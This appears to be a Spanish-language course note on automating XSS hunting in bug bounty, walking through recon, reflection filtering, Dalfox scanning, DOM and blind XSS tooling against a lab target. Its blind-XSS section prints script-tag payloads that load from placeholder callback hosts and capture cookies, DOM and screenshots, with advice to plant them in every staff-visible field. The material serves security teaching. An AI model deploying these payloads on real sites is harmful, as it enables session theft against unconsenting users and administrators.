---
tags:
  - Web/Red-Team
  - Pentesting/Enumeracion
  - XSS
Descripción: "Buscar XSS a mano en un programa con miles de endpoints no escala"
Fecha de actualización: 2026-06-08
Nota previa: "[[05 - Evasión y ofuscación de XSS]]"
Nota siguiente: "[[07 - Defacing]]"
Area: "[[XSS.base|XSS]]"
---
---

Buscar XSS a mano en un programa con miles de endpoints no escala. <mark style="background: #ADCCFFA6;">El hunting moderno de XSS es un *pipeline*: mapear la superficie → filtrar qué parámetros reflejan → confirmar ejecución → cubrir DOM y blind</mark>. Cada fase tiene su herramienta. Esta nota es el set que usarás en bug bounty real; las técnicas que automatizan ya las viste en [[04 - Descubrimiento de XSS]] y [[05 - Evasión y ofuscación de XSS]].

# 1. Mapear la superficie de ataque

Antes de probar payloads necesitas **dónde** probarlos: URLs con parámetros y parámetros ocultos.

```shell-session
$ gau target.htb | tee urls.txt          # URLs históricas (Open Threat Exchange, Wayback, etc.)
$ katana -u https://target.htb -jc        # crawler activo con parsing de JS
$ cat urls.txt | grep '=' | qsreplace FUZZ # normaliza parámetros para fuzzear
```

- **`gau`** ([getallurls](https://github.com/lc/gau)) y **`waybackurls`** vuelcan URLs históricas con parámetros que ya no aparecen enlazados. Mina de oro para parámetros olvidados.
- **`katana`** ([ProjectDiscovery](https://github.com/projectdiscovery/katana)) crawlea en activo y parsea JavaScript, descubriendo endpoints que un crawler clásico no ve.
- **`Arjun`** ([s0md3v](https://github.com/s0md3v/Arjun)) descubre parámetros **ocultos** (no enlazados) por fuzzing inteligente — un parámetro sin documentar es a menudo el que nadie ha auditado.

> [!important]+ La XSS no vive solo en parámetros de URL
> <mark style="background: #FF5582A6;">Cualquier entrada que acabe reflejada vale</mark>: cabeceras (`Referer`, `User-Agent`, `X-Forwarded-Host`), fragmentos de URL (`#...`, solo visibles en cliente — útiles para DOM XSS), nombres de fichero subidos, campos de perfil. Las herramientas de URL cubren una parte; el resto exige mirar el tráfico en Burp/Caido.

# 2. Filtrar reflejos

De cientos de parámetros, solo unos pocos reflejan la entrada y dejan pasar caracteres peligrosos sin escapar. Filtrar esto primero evita malgastar tiempo:

```shell-session
$ cat urls.txt | Gxss -c 100 | tee reflected.txt
$ cat urls.txt | kxss        # marca qué caracteres especiales (" ' < >) sobreviven
```

<mark style="background: #FFB8EBA6;">`kxss` y `Gxss` no confirman XSS</mark> — confirman **reflejo** y qué caracteres de ruptura de contexto (`<`, `>`, `"`, `'`) no se escapan. Es el filtro previo que reduce el universo de prueba a los candidatos reales antes de lanzar un escáner.

# 3. Confirmar la ejecución

Aquí entran los escáneres que inyectan payloads y verifican que **ejecutan**, no solo que se reflejan:

| Herramienta | Punto fuerte | Cuándo |
| - | - | - |
| **Dalfox** | Estándar actual (Go). Rápido, *parameter analysis*, verificación, encoder integrado | Confirmación masiva en pipeline |
| **XSStrike** | Fuzzing con análisis de contexto y generación de payloads | Casos manuales con WAF |
| **nuclei** | Templates dirigidos a patrones/CVEs concretos | XSS conocidos en apps comunes |

```shell-session
$ cat reflected.txt | dalfox pipe --waf-evasion --skip-bav
$ dalfox url "https://target.htb/search?q=FUZZ" -b https://tu-colaborador.htb
```

<mark style="background: #FFB86CA6;">`Dalfox`</mark> ([hahwul/dalfox](https://github.com/hahwul/dalfox)) es hoy el escáner XSS de facto en bug bounty: analiza el contexto del reflejo, prueba payloads adaptados, verifica la ejecución y trae un *blind XSS callback* integrado (`-b`). El flag `--waf-evasion` aplica las codificaciones de [[05 - Evasión y ofuscación de XSS|evasión]] automáticamente.

> [!warning]+ Ningún escáner sustituye la verificación manual
> Un escáner reporta el payload reflejado y *cree* que ejecuta, pero genera **falsos positivos** (se cuela en el HTML sin dispararse) y **falsos negativos** (no entiende un contexto raro o un WAF lo bloquea). Confirma siempre a mano antes de reportar — un `Impact: high` sin PoC ejecutable se cierra como *informational*.

# 4. DOM XSS

El XSS basado en DOM no aparece en el HTML del servidor, así que los escáneres de reflejo lo pierden. Necesita herramientas que sigan el flujo `source` → `sink` en el JavaScript del cliente:

- **`DOM Invader`**: integrado en el navegador de Burp Suite. <mark style="background: #8000E1A6;">Instrumenta el DOM y rastrea automáticamente de dónde viene la entrada hasta qué `sink` la ejecuta</mark>, encontrando en segundos lo que a mano es tedioso. Es la mejor herramienta para DOM XSS hoy.
- Para revisión estática del JS, búsqueda de sinks (`innerHTML`, `eval`, `document.write`) con `grep`/LinkFinder sobre los bundles descargados con `katana`.

# 5. Blind XSS

El blind XSS se dispara en una interfaz que **no ves** (panel de admin, visor de tickets, logs). Sin retorno visible, necesitas payloads que "llamen a casa" cuando ejecuten donde sea — distingue dos tipos de receptor:

```html
<script src="https://tu-id.xss.report"></script>       <!-- captura: cookies, DOM, screenshot (XSS Hunter/ezXSS) -->
<script src="https://tu-subdominio.oast.pro"></script>  <!-- callback OOB: solo confirma ejecución (Interactsh) -->
```

- **`XSS Hunter`**: el servicio alojado en `xsshunter.com` se descontinuó en 2023; hoy se usa **self-hosted** ([xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)) o **`ezXSS`** ([ssl/ezXSS](https://github.com/ssl/ezXSS)). Al ejecutar, capturan cookies, URL, DOM y captura de pantalla del contexto interno.
- **`Interactsh`** ([ProjectDiscovery](https://github.com/projectdiscovery/interactsh)) da un colaborador OOB efímero para detectar la ejecución cuando solo necesitas confirmar el *callback*.

<mark style="background: #FFB86CA6;">Siembra estos payloads en cada campo que pueda ver personal interno</mark> (nombre, dirección, `User-Agent`, formularios de contacto) y espera; es uno de los vectores más rentables porque alcanza paneles privilegiados (ver [[01 - XSS Almacenado]]).

# 6. Forjar y ofuscar payloads

- **`Hackvertor`** ([Burp, de Gareth Heyes](https://github.com/hackvertor/hackvertor)): aplica codificaciones y ofuscación con etiquetas inline (`<@base64>...<@/base64>`) directamente sobre la petición en Repeater. Imprescindible para iterar bypass de WAF sin codificar a mano.
- **`Burp Suite Pro`** trae un escáner activo que cubre los tres tipos de XSS y suele acertar más que el open-source cuando hay que evadir filtros.

# Flujo de referencia

```text
gau/katana/Arjun  →  kxss/Gxss  →  Dalfox  →  verificación manual
                                  ↘ DOM Invader (DOM)
                                  ↘ ezXSS/Interactsh (blind)
```

Con la vulnerabilidad confirmada y el payload listo, pasamos a **explotarla**. El primer ataque, el más simple, es el `defacing`: [[07 - Defacing]]. El instrumental de explotación encadenada y post-XSS (servidor de exfiltración, `BeEF`, CSP Evaluator) se amplía en [[07 - Herramientas para XSS]] del nivel avanzado.

> [!info]+ Fuentes y repos
> - [Dalfox](https://github.com/hahwul/dalfox) · [XSStrike](https://github.com/s0md3v/XSStrike) · [katana](https://github.com/projectdiscovery/katana) · [gau](https://github.com/lc/gau) · [Arjun](https://github.com/s0md3v/Arjun)
> - [kxss/Gxss](https://github.com/KathanP19/Gxss) · [qsreplace](https://github.com/tomnomnom/qsreplace)
> - [ezXSS](https://github.com/ssl/ezXSS) · [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express) · [Interactsh](https://github.com/projectdiscovery/interactsh) · [Hackvertor](https://github.com/hackvertor/hackvertor)
